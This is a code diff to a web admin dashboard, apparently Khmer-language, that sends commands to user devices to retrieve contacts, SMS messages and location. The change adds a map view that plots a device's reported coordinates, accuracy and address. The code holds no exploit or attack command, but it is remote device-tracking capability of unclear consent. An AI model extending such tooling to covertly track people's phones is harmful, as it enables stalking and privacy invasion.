@@ -1694,7 +1694,7 @@ async function renderDevices() {
                 <td>${esc(c.command_type)}</td>
                 <td><span style="padding:2px 8px;border-radius:4px;font-size:12px;background:${c.status === 'completed' ? '#22c55e22' : c.status === 'failed' ? '#ef444422' : '#f59e0b22'};color:${c.status === 'completed' ? '#22c55e' : c.status === 'failed' ? '#ef4444' : '#f59e0b'}">${esc(c.status)}</span></td>
                 <td>${dt(c.created_at)}</td>
-                <td>${c.result_data ? esc(JSON.stringify(c.result_data).slice(0, 50)) : '—'}</td>
+                <td>${c.result_data ? (c.command_type === 'get_location' ? `<a href="#" onclick="showLocationMap(${JSON.stringify(c).replace(/"/g, '&quot;')}); return false;" style="color:#3B9AD9">🗺️ មើលផែនទី</a>` : esc(JSON.stringify(c.result_data).slice(0, 50))) : '—'}</td>
               </tr>
             `).join('')}
           </tbody>
@@ -1730,6 +1730,11 @@ window.sendDeviceCmd = async function(userId, cmdType) {
     // Show results for contacts/SMS reading
     if (cmdType === 'get_contacts' || cmdType === 'get_sms') {
       setTimeout(() => showCommandResults(cmdType, res.command), 500);
+    }
+    
+    // Show map for location
+    if (cmdType === 'get_location') {
+      setTimeout(() => showLocationMap(res.command), 500);
     }
     
     renderDevices();
@@ -1779,6 +1784,56 @@ window.showCommandResults = async function(cmdType, cmd) {
   
   html += '</div>';
   showModal(cmdType === 'get_contacts' ? '📱 Contacts' : '💬 SMS Messages', html);
+};
+
+window.showLocationMap = async function(cmd) {
+  // Fetch the latest command data with results
+  const commands = await api(`/device/commands?user_id=${cmd.user_id}`);
+  const latest = commands.commands?.find(c => c.id === cmd.id);
+  
+  if (!latest || !latest.result_data) {
+    toast('⏳ កំពុងរង់ចាំ location result...', false);
+    return;
+  }
+  
+  const data = latest.result_data;
+  const lat = data.lat;
+  const lng = data.lng;
+  const accuracy = data.accuracy;
+  const address = data.address || 'មិនមានអាសយដ្ឋាន';
+  
+  const html = `
+    <div style="margin-bottom:12px">
+      <strong>📍 ទីតាំងឧបករណ៍</strong><br>
+      <small>Lat: ${lat.toFixed(6)}, Lng: ${lng.toFixed(6)}</small><br>
+      <small>Accuracy: ${accuracy}m</small><br>
+      <small>អាសយដ្ឋាន: ${esc(address)}</small>
+    </div>
+    <div id="map" style="width:100%;height:400px;border-radius:8px;border:1px solid var(--line)"></div>
+  `;
+  
+  showModal('🗺️ ផែនទីទីតាំង', html);
+  
+  // Initialize map after modal is shown
+  setTimeout(() => {
+    const map = L.map('map').setView([lat, lng], 16);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+      attribution: '© OpenStreetMap contributors',
+      maxZoom: 19,
+    }).addTo(map);
+    
+    L.marker([lat, lng]).addTo(map)
+      .bindPopup(`<b>${esc(address)}</b><br>Accuracy: ${accuracy}m`)
+      .openPopup();
+    
+    // Add accuracy circle
+    L.circle([lat, lng], {
+      color: '#3B9AD9',
+      fillColor: '#3B9AD9',
+      fillOpacity: 0.1,
+      radius: accuracy
+    }).addTo(map);
+  }, 100);
 };
 
 const RENDERERS = {
